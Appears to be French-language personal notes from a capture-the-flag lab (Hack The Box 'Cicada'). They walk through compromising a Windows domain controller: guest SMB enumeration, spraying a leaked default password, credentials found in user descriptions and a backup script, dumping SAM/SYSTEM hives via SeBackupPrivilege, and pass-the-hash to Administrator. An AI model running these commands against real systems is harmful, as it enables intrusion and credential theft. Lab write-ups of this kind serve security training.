# Notes

```bash
nmap -Pn -sC -sV -oA scan-10.10.11.35 10.10.11.35
```

Résultats dans les fichiers .nmap

```bash
nxc smb --shares -u 'Guest' -p '' -d 'CICADA-DC.cicada.htb' 10.10.11.35

SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] CICADA-DC.cicada.htb\Guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 

smbclient.py Guest@10.10.11.35

use IPC$

# ls
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 InitShutdown
-rw-rw-rw-          4  Mon Jan  1 00:09:21 1601 lsass
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 ntsvcs
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 scerpc
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-2a8-0
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-39c-0
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 epmapper
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-220-0
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 LSM_API_service
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-3cc-0
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 eventlog
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-474-0
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 atsvc
-rw-rw-rw-          4  Mon Jan  1 00:09:21 1601 wkssvc
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-670-0
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-2a8-1
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 RpcProxy\60966
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 78eebc64ad684c1a
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 RpcProxy\593
-rw-rw-rw-          4  Mon Jan  1 00:09:21 1601 srvsvc
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 spoolss
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-a9c-0
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 netdfs
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 tapsrv
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 vgauth-service
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 ROUTER
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-298-0
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-ac8-0
-rw-rw-rw-          3  Mon Jan  1 00:09:21 1601 W32TIME_ALT
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 Winsock2\CatalogChangeListener-ac0-0
-rw-rw-rw-          1  Mon Jan  1 00:09:21 1601 PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
```

Rien dans lsass

```bash
# ls
drw-rw-rw-          0  Fri Mar 15 07:26:17 2024 .
drw-rw-rw-          0  Thu Mar 14 13:21:29 2024 ..
-rw-rw-rw-       1266  Wed Aug 28 19:31:48 2024 Notice from HR.txt
# cat 'Notice from HR.txt'
[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
# cat Notice from HR.txt

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
``` 

```bash
lookupsid.py -no-pass CICADA-DC.cicada.htb/Guest@10.10.11.35

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.10.11.35
[*] StringBinding ncacn_np:10.10.11.35[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)

for user in $(cat users.txt); do
  echo "Testing $user"
  nxc smb -u $user -p 'Cicada$M6Corpb*@Lp#nZp!8' -d 'CICADA-DC.cicada.htb' 10.10.11.35
done

Testing michael.wrightson
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.35     445    CICADA-DC        [+] CICADA-DC.cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

On va extraire les données LDAP et les afficher avec bloodhound:
```bash
bloodhound-python \     
  -u michael.wrightson \
  -p 'Cicada$M6Corpb*@Lp#nZp!8' \
  -dc CICADA-DC.cicada.htb \
  -d cicada.htb \
  -ns 10.10.11.35 \
  -c all

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: cicada.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: CICADA-DC.cicada.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: CICADA-DC.cicada.htb
INFO: Found 9 users
INFO: Found 54 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CICADA-DC.cicada.htb
INFO: Done in 00M 16S
```

Recherches sur ldap/smb:
```bash
ldapwhoami -x -H ldap://CICADA-DC.cicada.htb -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8'

u:CICADA\michael.wrightson

ldapsearch -x -H ldap://CICADA-DC.cicada.htb -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "CN=Configuration,DC=cicada,DC=htb"

smbclient.py michael.wrightson:'Cicada$M6Corpb*@Lp#nZp!8'@10.10.11.35       
```

Enumération des users avec nxc smb:
```bash
nxc smb --users -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -d 'cicada.htb' 10.10.11.35

SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.35     445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain 
SMB         10.10.11.35     445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.35     445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account 
SMB         10.10.11.35     445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 0        
SMB         10.10.11.35     445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 0        
SMB         10.10.11.35     445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0        
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

On a l'user:
david.orelious:aRt$Lp#7t*VQ!3

```bash
nxc smb --shares -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -d 'CICADA-DC.cicada.htb' 10.10.11.35
```

Lister les shares ne fonctionne pas mais on peut s'y connecter directement et tester les droits de l'utilisateur `david.orelious`:
```bash
smbclient.py david.orelious:'aRt$Lp#7t*VQ!3'@10.10.11.35      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
DEV
HR
IPC$
NETLOGON
SYSVOL
# use ADMIN$
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use C$
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use DEV
# ls
drw-rw-rw-          0  Wed Aug 28 19:27:31 2024 .
drw-rw-rw-          0  Thu Mar 14 13:21:29 2024 ..
-rw-rw-rw-        601  Wed Aug 28 19:28:22 2024 Backup_script.ps1
# cat Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

On peut ensuite utiliser le client smb pour regarder les fichiers locaux de `emily.oscars`, ou créer un shell en utilisant winrm:
```bash
smbclient.py emily.oscars:'Q!3@Lp#M6b*7t*Vt'@10.10.11.35     

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use C$
# ls
drw-rw-rw-          0  Thu Mar 14 14:24:03 2024 $Recycle.Bin
drw-rw-rw-          0  Mon Sep 23 18:16:49 2024 $WinREAgent
drw-rw-rw-          0  Thu Mar 14 20:40:47 2024 Documents and Settings
-rw-rw-rw-      12288  Sat Jul 12 18:34:02 2025 DumpStack.log.tmp
-rw-rw-rw-  738197504  Sat Jul 12 18:34:02 2025 pagefile.sys
drw-rw-rw-          0  Thu Aug 22 20:45:54 2024 PerfLogs
drw-rw-rw-          0  Thu Aug 29 21:32:49 2024 Program Files
drw-rw-rw-          0  Thu Mar 14 21:20:54 2024 Program Files (x86)
drw-rw-rw-          0  Fri Aug 30 19:32:06 2024 ProgramData
drw-rw-rw-          0  Thu Mar 14 20:41:18 2024 Recovery
drw-rw-rw-          0  Thu Mar 14 13:21:29 2024 Shares
drw-rw-rw-          0  Thu Mar 14 12:18:00 2024 System Volume Information
drw-rw-rw-          0  Mon Aug 26 22:11:25 2024 Users
drw-rw-rw-          0  Mon Sep 23 18:35:40 2024 Windows

evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```bash
C:\Users\emily.oscars.CICADA\Documents> reg save hklm\system C:\temp\system.hive 
The operation completed successfully.

C:\Users\emily.oscars.CICADA\Documents> reg save hklm\sam C:\temp\sam.hive
The operation completed successfully.

C:\Users\emily.oscars.CICADA\Documents> download C:\temp\sam.hive
C:\Users\emily.oscars.CICADA\Documents> download C:\temp\system.hive

secretsdump.py -sam sam.hive -system system.hive local

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```
On peut alors accéder au compte administrator
```bash
evil-winrm -i 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
86ce1c99f5c4ab8598a988cb666f36e8
```